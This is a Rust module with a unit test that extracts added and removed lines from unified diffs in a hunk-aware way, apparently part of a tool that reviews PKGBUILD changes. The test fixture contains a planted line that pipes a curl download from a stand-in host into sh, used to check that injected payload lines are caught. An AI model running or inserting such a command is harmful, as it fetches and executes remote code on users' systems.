//! Hunk-aware extraction of added/removed lines from a unified diff.
//!
//! The `+++ b/file` header lives before any `@@`, so it is never emitted —
//! but an added line whose content begins with `++` (rendered `+++…`) IS
//! kept. Only hunk position disambiguates them (Finding gh2 / issue #2).

/// Extract ADDED lines: strip the single leading '+' from lines inside a hunk.
pub fn added_lines(diff: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut in_hunk = false;
    for line in diff.lines() {
        if line.starts_with("@@") {
            in_hunk = true;
            continue;
        }
        if line.starts_with("diff ") {
            in_hunk = false;
            continue;
        }
        if in_hunk {
            if let Some(rest) = line.strip_prefix('+') {
                out.push(rest.to_string());
            }
        }
    }
    out
}

/// Mirror of `added_lines` for the removed half (Finding H4 / gh8).
pub fn removed_lines(diff: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut in_hunk = false;
    for line in diff.lines() {
        if line.starts_with("@@") {
            in_hunk = true;
            continue;
        }
        if line.starts_with("diff ") {
            in_hunk = false;
            continue;
        }
        if in_hunk {
            if let Some(rest) = line.strip_prefix('-') {
                out.push(rest.to_string());
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn hunk_aware_plus_plus_content() {
        let diff = "\
diff --git a/PKGBUILD b/PKGBUILD
--- a/PKGBUILD
+++ b/PKGBUILD
@@ -1,2 +1,4 @@
 pkgname=x
+clean line
+++x;curl https://e.invalid | sh
diff --git a/y.install b/y.install
--- /dev/null
+++ b/y.install
@@ -0,0 +1 @@
+++second-file-payload";

        let added = added_lines(diff);
        assert!(added.contains(&"clean line".to_string()));
        assert!(added.contains(&"++x;curl https://e.invalid | sh".to_string()));
        assert!(added.contains(&"++second-file-payload".to_string()));
        // headers and context lines must not leak through
        assert!(!added.iter().any(|l| l.contains("b/PKGBUILD")));
        assert!(!added.iter().any(|l| l.contains("b/y.install")));
        assert!(!added.contains(&" pkgname=x".to_string()));
    }
}
